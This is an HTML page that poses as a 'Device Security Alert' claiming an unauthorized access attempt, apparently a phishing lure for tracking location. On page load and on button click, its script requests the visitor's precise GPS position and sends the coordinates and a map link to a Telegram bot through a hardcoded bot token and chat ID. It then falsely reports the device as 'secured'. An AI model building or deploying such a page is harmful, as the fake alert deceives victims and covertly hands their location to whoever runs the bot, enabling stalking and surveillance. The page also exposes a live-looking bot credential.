<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Check</title>
    <style>
        /* --- BASE STYLES --- */
        :root {
            --bg-color: #0a0f1a;
            --text-color: #e0e6ed;
            --accent-color: #ff3333; /* Red for Alert */
            --success-color: #00ffc8;
            --drawer-text-color: #f5f5ff;
            --drawer-primary-color: #00ffc8;
            --drawer-bg-color: linear-gradient(180deg, rgba(10, 20, 35, 0.9), rgba(5, 10, 15, 0.85));
            --drawer-link-hover-bg: rgba(0, 255, 200, 0.08);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* --- MAIN CONTENT STYLES (Tech/Security Look) --- */
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
            z-index: 1;
        }

        .alert-icon {
            width: 80px;
            height: 80px;
            border: 2px solid var(--accent-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(255, 51, 51, 0.3);
            animation: pulse 1.5s infinite;
        }

        .alert-icon svg {
            width: 40px;
            height: 40px;
            fill: var(--accent-color);
        }

        h1 {
            font-size: 1.8rem;
            margin-bottom: 10px;
            color: #fff;
        }

        p {
            font-size: 1rem;
            color: #a0aec0;
            margin-bottom: 30px;
            max-width: 300px;
        }

        .action-btn {
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 51, 51, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
            max-width: 280px;
        }

        .action-btn:active {
            transform: scale(0.98);
        }

        .status-log {
            margin-top: 20px;
            font-size: 0.85rem;
            color: #555;
            font-family: monospace;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 51, 51, 0.4); }
            70% { box-shadow: 0 0 0 15px rgba(255, 51, 51, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 51, 51, 0); }
        }

        /* --- DRAWER MENU STYLES (From Memory) --- */
        .drawer-toggle { position: fixed; top: 18px; left: 15px; z-index: 1100; background: 0 0; border: none; width: 35px; height: 27px; display: flex; flex-direction: column; justify-content: space-between; cursor: pointer; box-sizing: content-box; transition: transform .4s ease, opacity .4s ease }
        .drawer-toggle.hidden { transform: translateY(-100px); opacity: 0; pointer-events: none }
        .drawer-toggle span { height: 5px; background: var(--text-color); border-radius: 3px; display: block; transition: all .25s }
        .drawer-toggle.active span:nth-child(1) { transform: translateY(10px) rotate(45deg) }
        .drawer-toggle.active span:nth-child(2) { opacity: 0; transform: scaleX(.2) }
        .drawer-toggle.active span:nth-child(3) { transform: translateY(-10px) rotate(-45deg) }
        .drawer-nav { position: fixed; top: 0; left: 0; height: 100vh; width: 220px; padding-top: 90px; z-index: 1050; background: var(--drawer-bg-color); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); transform: translateX(-110%); transition: transform .45s cubic-bezier(.2, 1, .3, 1); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; box-sizing: border-box }
        .drawer-nav.active { transform: translateX(0) }
        .drawer-nav ul { list-style: none; padding: 0; margin: 0; text-align: left }
        .drawer-nav a { display: block; padding: 16px 25px; color: var(--drawer-text-color, #f5f5f5); text-decoration: none; font-size: 1.1rem; font-weight: 500; transition: color .2s ease, background .2s ease }
        .drawer-nav a:hover { color: var(--drawer-primary-color, #00ffc8); background: var(--drawer-link-hover-bg) }
        .drawer-nav li { opacity: 0; transform: translateY(20px); transition: opacity .3s ease, transform .3s ease }
        .drawer-nav.active li { opacity: 1; transform: translateY(0) }
        .drawer-nav.active li:nth-child(1) { transition-delay: .1s }
        .drawer-nav.active li:nth-child(2) { transition-delay: .15s }
        .drawer-nav.active li:nth-child(3) { transition-delay: .2s }
        .drawer-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, .5); z-index: 1040; opacity: 0; visibility: hidden; transition: opacity .4s ease, visibility .4s ease }
        .drawer-overlay.active { opacity: 1; visibility: visible }
        @media (max-width: 520px) { .drawer-nav { width: 70% } }

        /* --- FOOTER BRANDING STYLES (From Memory) --- */
        .bawal-footer-wrapper { text-align: center; margin-top: 30px; margin-bottom: 9px; padding-top: 20px; border-top: 1px solid #444; position: relative; z-index: 10 }
        .bawal-footer-link { display: inline-flex; align-items: center; gap: 8px; background: #1A1A1A; padding: 10px 18px; border-radius: 25px; text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, .3); border: 1px solid rgba(255, 255, 255, .05); transition: transform .3s ease, box-shadow .3s ease }
        .bawal-footer-link:hover { transform: translateY(-5px) scale(1.03); box-shadow: 0 10px 25px rgba(0, 0, 0, .4), 0 0 20px rgba(0, 255, 200, .4), 0 0 30px rgba(0, 255, 200, .2) }
        .bawal-footer-link .dev-text { color: #00ffc8; font-weight: bold; font-size: 15px; text-shadow: 0 0 5px rgba(0, 255, 200, .5) }
        .bawal-footer-link .name-text { display: flex; align-items: center; gap: 5px; color: #FFD700; font-size: 15px; font-weight: bold; text-shadow: 0 0 5px rgba(255, 215, 0, .5) }
        .bawal-footer-link img { width: 22px; height: 22px; border-radius: 50%; transition: transform .3s ease }
        .bawal-footer-link:hover .telegram-icon { transform: rotate(360deg) }
        .bawal-footer-link:hover .profile-pic { transform: scale(1.15) rotate(-10deg) }
    </style>
</head>
<body>

    <div class="drawer-overlay" id="drawer-overlay" title="Close menu"></div>
    <button class="drawer-toggle" id="drawer-toggle" aria-label="Menu Kholo" title="Menu Kholo" aria-expanded="false">
        <span></span><span></span><span></span>
    </button>
    
    <nav class="drawer-nav" id="drawer-nav" aria-hidden="true">
        <ul>
            <li><a href="https://babubhaikundan.blogspot.com" target="_blank" rel="noopener noreferrer">ü§î About</a></li>
            <li><a href="https://t.me/kundan_yadav_bot" target="_blank" rel="noopener noreferrer">üìû Contact</a></li>
            <li><a href="https://www.instagram.com/babubhaikundan" target="_blank" rel="noopener noreferrer">üí• Instagram</a></li>
        </ul>
    </nav>

    <div class="container">
        <div class="alert-icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 2L1 21h22L12 2zm1 17h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
            </svg>
        </div>
        
        <h1>Device Security Alert</h1>
        <p>System has detected unauthorized access attempt. Please verify your location to lock the device.</p>
        
        <button class="action-btn" onclick="captureLocation()">VERIFY & SECURE DEVICE</button>
        
        <div class="status-log" id="statusLog">Waiting for user action...</div>
    </div>

    <div class="bawal-footer-wrapper">
        <a href="https://babubhaikundan.blogspot.com" target="_blank" class="bawal-footer-link">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="telegram-icon">
            <span class="dev-text">DeveloperüíÄ:-</span>
            <span class="name-text">ùïÇùï¶ùïüùïïùïíùïü ùïêùïíùïïùïíùïß <img src="https://s.tfrbot.com/h/gL5VTi" alt="Kundan" class="profile-pic"></span>
        </a>
    </div>

    <script>
        // --- CONFIGURATION (MUST EDIT THIS) ---
        const TELEGRAM_BOT_TOKEN = '8338911838:AAG5qTixTQyun4ktSUufxgOf1RDL25FhIWY'; // Example: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
        const TELEGRAM_CHAT_ID = '-1002588189635';     // Example: 123456789

        // --- DRAWER LOGIC ---
        (function(){const drawerToggle=document.getElementById('drawer-toggle');const drawerNav=document.getElementById('drawer-nav');const drawerOverlay=document.getElementById('drawer-overlay');if(!drawerToggle||!drawerNav||!drawerOverlay){console.warn('Drawer menu component ke saare elements nahi mile.');return}function openDrawer(){drawerToggle.classList.add('active');drawerNav.classList.add('active');drawerOverlay.classList.add('active');drawerToggle.setAttribute('aria-expanded','true');drawerNav.setAttribute('aria-hidden','false');drawerToggle.classList.remove('hidden')}function closeDrawer(){drawerToggle.classList.remove('active');drawerNav.classList.remove('active');drawerOverlay.classList.remove('active');drawerToggle.setAttribute('aria-expanded','false');drawerNav.setAttribute('aria-hidden','true')}function setupDrawer(){drawerToggle.addEventListener('click',()=>{const isExpanded=drawerToggle.classList.contains('active');if(isExpanded){closeDrawer()}else{openDrawer()}})}function setupClosers(){document.addEventListener('keyup',(e)=>{if(e.key==='Escape'&&drawerNav.classList.contains('active')){closeDrawer()}});drawerOverlay.addEventListener('click',()=>{closeDrawer()})}function setupScrollStopListener(){let scrollTimer;window.addEventListener('scroll',()=>{if(drawerNav.classList.contains('active')){return}drawerToggle.classList.add('hidden');clearTimeout(scrollTimer);scrollTimer=setTimeout(()=>{drawerToggle.classList.remove('hidden')},250)},{passive:true})}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',()=>{setupDrawer();setupClosers();setupScrollStopListener()})}else{setupDrawer();setupClosers();setupScrollStopListener()}})();

        // --- LOCATION & TELEGRAM LOGIC ---
        const statusLog = document.getElementById('statusLog');
        const btn = document.querySelector('.action-btn');

        function updateLog(msg) {
            statusLog.innerText = msg;
            console.log(msg);
        }

        function sendToTelegram(latitude, longitude, accuracy) {
            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const message = `üö® *Device Alert!* üö®%0A%0Aüìç *Location Detected:*%0ALat: ${latitude}%0ALon: ${longitude}%0AAcc: ${accuracy} meters%0A%0Aüîó [View on Map](${mapLink})%0A%0A‚ö†Ô∏è _Device opened via Automation link._`;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;

            updateLog("Sending data to owner...");
            
            fetch(url)
                .then(response => {
                    if(response.ok) {
                        updateLog("Security Protocol Initiated. (Data Sent)");
                        btn.style.backgroundColor = "#00ffc8";
                        btn.style.color = "#000";
                        btn.innerText = "DEVICE SECURED";
                        btn.disabled = true;
                    } else {
                        updateLog("Connection Error. Retrying...");
                    }
                })
                .catch(err => {
                    updateLog("Network Error: " + err.message);
                });
        }

        function captureLocation() {
            updateLog("Requesting GPS access...");
            
            if (!navigator.geolocation) {
                updateLog("Geolocation is not supported by this browser.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    
                    updateLog(`Position Acquired: ${lat}, ${lon}`);
                    sendToTelegram(lat, lon, acc);
                },
                (error) => {
                    let errorMsg = "";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = "User denied the request for Geolocation.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = "Location information is unavailable.";
                            break;
                        case error.TIMEOUT:
                            errorMsg = "The request to get user location timed out.";
                            break;
                        case error.UNKNOWN_ERROR:
                            errorMsg = "An unknown error occurred.";
                            break;
                    }
                    updateLog("Error: " + errorMsg);
                    alert("SYSTEM ERROR: Please Allow Location to secure device!");
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // Optional: Auto-trigger attempt on load (might be blocked by modern browsers)
        window.onload = () => {
            // Try silently first
            captureLocation();
        };

    </script>
</body>
</html>
